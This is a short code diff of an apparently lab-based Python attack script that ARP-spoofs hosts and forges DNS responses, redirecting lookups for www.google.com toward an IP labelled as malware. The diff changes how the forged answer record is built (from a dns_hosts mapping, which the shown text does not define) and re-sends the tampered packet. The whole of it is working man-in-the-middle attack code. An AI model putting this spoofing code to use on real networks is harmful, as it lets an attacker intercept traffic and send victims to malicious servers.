@@ -5,7 +5,7 @@ ipM1 = "192.168.56.101" #  Rename to IPAttacker?
 ipM2 = "192.168.56.102"
 ipM3 = "192.168.56.103" # IPVictim?
 ipMal = "50.63.7.226"   # Malware IP
-trapUrl = "www.google.com"
+trapUrl = "www.google.com."
 ipTrap = "142.251.32.100"
 
 def ARP_spoofing():
@@ -55,7 +55,8 @@ def process_packet(packet):
             print("DNS packet with destination IP " + trapUrl + " found!")
             if (dns_packet.qr == 1):
                 print("Response Data: " + dns_packet.an.rdata)
-                dns_packet.an.rdata = ipMal
+                # dns_packet.an.rdata = ipMal
+                dns_packet.an = DNSRR(rrname=trapUrl, rdata=dns_hosts[trapUrl])
                 del packet[IP].chksum
                 del packet[UDP].chksum
                 send(packet, verbose=False)
